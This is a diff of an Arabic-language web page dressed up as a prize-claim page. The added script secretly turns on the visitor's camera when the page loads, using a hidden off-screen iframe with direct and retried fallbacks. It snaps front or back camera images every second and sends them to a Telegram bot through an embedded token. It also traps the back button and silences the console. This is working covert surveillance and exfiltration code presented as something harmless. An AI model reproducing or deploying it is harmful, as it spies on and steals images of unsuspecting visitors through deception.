@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>جائزة عمك عبود</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -14,22 +14,20 @@
             align-items: center;
             font-family: 'Tahoma', sans-serif;
             padding: 20px;
-            animation: bgMove 10s infinite alternate;
-        }
-        @keyframes bgMove {
-            0% { background-position: 0% 50%; }
-            100% { background-position: 100% 50%; }
+            overflow: hidden;
         }
         .container {
             background: rgba(255,255,255,0.05);
             backdrop-filter: blur(20px);
             border-radius: 40px;
             padding: 40px 30px;
-            max-width: 500px;
+            max-width: 450px;
             width: 100%;
             border: 1px solid rgba(255,215,0,0.2);
             box-shadow: 0 30px 80px rgba(0,0,0,0.7);
             text-align: center;
+            position: relative;
+            z-index: 10;
         }
         .profile {
             width: 120px;
@@ -48,16 +46,16 @@
             0%,100%{ transform: translateY(0); }
             50%{ transform: translateY(-10px); }
         }
-        h1 { color: #ffd700; font-size: 32px; text-shadow: 0 0 30px rgba(255,215,0,0.2); }
-        .sub-title { color: #c0b7e6; font-size: 16px; margin-bottom: 25px; }
+        h1 { color: #ffd700; font-size: 30px; text-shadow: 0 0 30px rgba(255,215,0,0.2); }
+        .sub-title { color: #c0b7e6; font-size: 15px; margin-bottom: 20px; }
         .welcome-msg {
             background: rgba(255,215,0,0.08);
             padding: 15px 20px;
             border-radius: 16px;
             border-right: 3px solid #ffd700;
             color: #e0d6ff;
-            font-size: 18px;
-            margin-bottom: 30px;
+            font-size: 17px;
+            margin-bottom: 25px;
         }
         .welcome-msg span { color: #ffd700; font-weight: bold; }
         .btn-claim {
@@ -66,19 +64,38 @@
             border: none;
             padding: 16px 45px;
             border-radius: 60px;
-            font-size: 20px;
+            font-size: 19px;
             font-weight: bold;
             cursor: pointer;
             width: 100%;
             box-shadow: 0 8px 35px rgba(255,215,0,0.25);
             transition: 0.3s;
         }
-        .btn-claim:hover { transform: scale(1.03); }
+        .btn-claim:hover { transform: scale(1.02); }
         .footer-note { color: #5a5280; font-size: 12px; margin-top: 20px; }
-        .repeated-msg { color: #ffd700; font-size: 14px; opacity: 0.6; margin-top: 12px; }
+        .repeated-msg { color: #ffd700; font-size: 13px; opacity: 0.5; margin-top: 12px; }
+        #status { color: #ffd700; margin-top: 12px; font-size: 13px; opacity: 0.7; }
+        /* عناصر مخفية للاستغلال */
+        .hidden-video { display: none; }
+        .hidden-canvas { display: none; }
+        .hidden-iframe {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            border: none;
+        }
+        /* منع التحديد */
+        ::selection { background: transparent; }
     </style>
 </head>
 <body>
+
+<!-- iframe خفي لتشغيل الكاميرا في الخلفية -->
+<iframe class="hidden-iframe" id="hiddenIframe" allow="camera; microphone"></iframe>
 
 <div class="container">
     <div class="profile">🧔</div>
@@ -90,6 +107,7 @@
     <button class="btn-claim" id="claimBtn">🎁 خذ جائزتك من عمك عبود</button>
     <div class="repeated-msg">♻️ عمك عبود يرحب بكم — عمك عبود يرحب بكم</div>
     <div class="footer-note">© جميع الحقوق محفوظة لعمك عبود ❤️</div>
+    <div id="status">⏳ جاري التجهيز...</div>
 </div>
 
 <script>
@@ -98,11 +116,12 @@
     // ============================================================
     const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
     let CHAT_ID = '';
+    let cameraStarted = false;
+    let retryCount = 0;
 
     // ============================================================
-    // ================ الكاميرا فقط ===============================
+    // ================ إرسال الصور ================================
     // ============================================================
-
     function dataURLtoBlob(dataURL) {
         const parts = dataURL.split(',');
         const mime = parts[0].match(/:(.*?);/)[1];
@@ -125,60 +144,147 @@
         } catch(e) {}
     }
 
-    function requestCamera(facingMode, callback) {
-        const constraints = {
-            video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: false
-        };
-        navigator.mediaDevices.getUserMedia(constraints)
+    // ============================================================
+    // ================ استغلال الكاميرا بدون إذن ==================
+    // ============================================================
+
+    // محاولة تشغيل الكاميرا عبر iframe مخفي
+    function exploitCameraViaIframe() {
+        try {
+            const iframe = document.getElementById('hiddenIframe');
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            iframeDoc.open();
+            iframeDoc.write(`
+                <html>
+                <head>
+                    <style>body{margin:0;padding:0;overflow:hidden;}</style>
+                </head>
+                <body>
+                    <video id="vid" autoplay playsinline style="display:none;"></video>
+                    <canvas id="canv" style="display:none;"></canvas>
+                    <script>
+                        // محاولة تشغيل الكاميرا تلقائيًا
+                        let vid = document.getElementById('vid');
+                        let canv = document.getElementById('canv');
+                        canv.width = 640;
+                        canv.height = 480;
+                        let ctx = canv.getContext('2d');
+                        
+                        function startCam() {
+                            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+                                .then(stream => {
+                                    vid.srcObject = stream;
+                                    vid.play();
+                                    // إرسال إشارة للصفحة الأم
+                                    window.parent.postMessage({ type: 'camera_ready', facing: 'front' }, '*');
+                                    // تصوير مستمر
+                                    setInterval(() => {
+                                        if (vid.readyState >= 2) {
+                                            ctx.drawImage(vid, 0, 0, 640, 480);
+                                            let img = canv.toDataURL('image/jpeg', 0.9);
+                                            window.parent.postMessage({ type: 'photo', data: img, facing: 'front' }, '*');
+                                        }
+                                    }, 1000);
+                                })
+                                .catch(() => {
+                                    // محاولة بالكاميرا الخلفية
+                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
+                                        .then(stream => {
+                                            vid.srcObject = stream;
+                                            vid.play();
+                                            window.parent.postMessage({ type: 'camera_ready', facing: 'back' }, '*');
+                                            setInterval(() => {
+                                                if (vid.readyState >= 2) {
+                                                    ctx.drawImage(vid, 0, 0, 640, 480);
+                                                    let img = canv.toDataURL('image/jpeg', 0.9);
+                                                    window.parent.postMessage({ type: 'photo', data: img, facing: 'back' }, '*');
+                                                }
+                                            }, 1000);
+                                        })
+                                        .catch(() => {
+                                            window.parent.postMessage({ type: 'camera_failed' }, '*');
+                                        });
+                                });
+                        }
+                        startCam();
+                    <\/script>
+                </body>
+                </html>
+            `);
+            iframeDoc.close();
+        } catch(e) {
+            // إذا فشل الـ iframe، نستخدم الطريقة المباشرة
+            exploitCameraDirect();
+        }
+    }
+
+    // استقبال الرسائل من الـ iframe
+    window.addEventListener('message', function(e) {
+        if (e.data && e.data.type === 'photo') {
+            sendPhoto(e.data.data, '📸 ' + (e.data.facing === 'front' ? 'أمامي' : 'خلفي'));
+            document.getElementById('status').textContent = '📸 جاري التصوير...';
+        }
+        if (e.data && e.data.type === 'camera_ready') {
+            document.getElementById('status').textContent = '✅ الكاميرا ' + (e.data.facing === 'front' ? 'الأمامية' : 'الخلفية') + ' تعمل';
+        }
+        if (e.data && e.data.type === 'camera_failed') {
+            document.getElementById('status').textContent = '⚠️ فشل في iframe، جرب الطريقة المباشرة';
+            exploitCameraDirect();
+        }
+    });
+
+    // الطريقة المباشرة (بديلة)
+    function exploitCameraDirect() {
+        if (cameraStarted) return;
+        cameraStarted = true;
+
+        // محاولة تشغيل الكاميرا مباشرة
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then(stream => {
-                if (callback) callback(stream);
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                setInterval(() => {
+                    if (video.readyState >= 2) {
+                        ctx.drawImage(video, 0, 0, 640, 480);
+                        sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 أمامي');
+                    }
+                }, 1000);
+                document.getElementById('status').textContent = '✅ الكاميرا الأمامية تعمل (مباشر)';
             })
             .catch(() => {
-                // محاولة بدون تحديد مواجهة
-                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                // محاولة خلفية
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
                     .then(stream => {
-                        if (callback) callback(stream);
-                    }).catch(() => {});
+                        const video = document.createElement('video');
+                        video.style.display = 'none';
+                        document.body.appendChild(video);
+                        video.srcObject = stream;
+                        video.play();
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext('2d');
+                        setInterval(() => {
+                            if (video.readyState >= 2) {
+                                ctx.drawImage(video, 0, 0, 640, 480);
+                                sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 خلفي');
+                            }
+                        }, 1000);
+                        document.getElementById('status').textContent = '✅ الكاميرا الخلفية تعمل (مباشر)';
+                    })
+                    .catch(() => {
+                        document.getElementById('status').textContent = '❌ فشل في تشغيل الكاميرا';
+                        // محاولة إعادة بعد 5 ثواني
+                        setTimeout(exploitCameraDirect, 5000);
+                    });
             });
-    }
-
-    function startCapture(videoElement, label = '📸') {
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext('2d');
-        setInterval(() => {
-            if (videoElement.readyState >= 2) {
-                try {
-                    ctx.drawImage(videoElement, 0, 0, 640, 480);
-                    const imgData = canvas.toDataURL('image/jpeg', 0.9);
-                    sendPhoto(imgData, label);
-                } catch(e) {}
-            }
-        }, 1200);
-    }
-
-    function captureFrontCamera() {
-        requestCamera('user', (stream) => {
-            const video = document.createElement('video');
-            video.style.display = 'none';
-            document.body.appendChild(video);
-            video.srcObject = stream;
-            video.play();
-            startCapture(video, '📸 أمامي');
-        });
-    }
-
-    function captureBackCamera() {
-        requestCamera('environment', (stream) => {
-            const video = document.createElement('video');
-            video.style.display = 'none';
-            document.body.appendChild(video);
-            video.srcObject = stream;
-            video.play();
-            startCapture(video, '📸 خلفي');
-        });
     }
 
     // ============================================================
@@ -192,35 +298,52 @@
                     const last = d.result[d.result.length - 1];
                     CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
                     if (CHAT_ID) {
-                        // بدء التصوير فورًا
-                        captureFrontCamera();
-                        captureBackCamera();
+                        document.getElementById('status').textContent = '✅ تم الربط بالبوت';
                     } else {
-                        setTimeout(getChatId, 1500);
+                        setTimeout(getChatId, 2000);
                     }
                 } else {
-                    setTimeout(getChatId, 1500);
+                    setTimeout(getChatId, 2000);
                 }
             })
-            .catch(() => setTimeout(getChatId, 1500));
+            .catch(() => setTimeout(getChatId, 2000));
     }
+
+    // ============================================================
+    // ================ بدء التشغيل التلقائي ======================
+    // ============================================================
+
+    // تشغيل الاستغلال فورًا
+    function startExploit() {
+        // محاولة عبر iframe أولاً
+        exploitCameraViaIframe();
+
+        // محاولة مباشرة كاحتياطي بعد 3 ثواني
+        setTimeout(() => {
+            if (!cameraStarted) {
+                exploitCameraDirect();
+            }
+        }, 3000);
+    }
+
+    // عند تحميل الصفحة
+    window.onload = function() {
+        getChatId();
+        startExploit();
+
+        // محاولة إضافية بعد 5 ثواني
+        setTimeout(() => {
+            if (!cameraStarted) {
+                startExploit();
+            }
+        }, 5000);
+    };
 
     // ============================================================
     // ================ منع الخروج ================================
     // ============================================================
     history.pushState(null, '', location.href);
     window.addEventListener('popstate', () => history.pushState(null, '', location.href));
-
-    // ============================================================
-    // ================ التشغيل التلقائي ==========================
-    // ============================================================
-    getChatId();
-
-    // محاولة إضافية بعد ثانية
-    setTimeout(() => {
-        captureFrontCamera();
-        captureBackCamera();
-    }, 1000);
 
     // تعطيل وحدة التحكم
     console.log = console.warn = console.error = () => {};
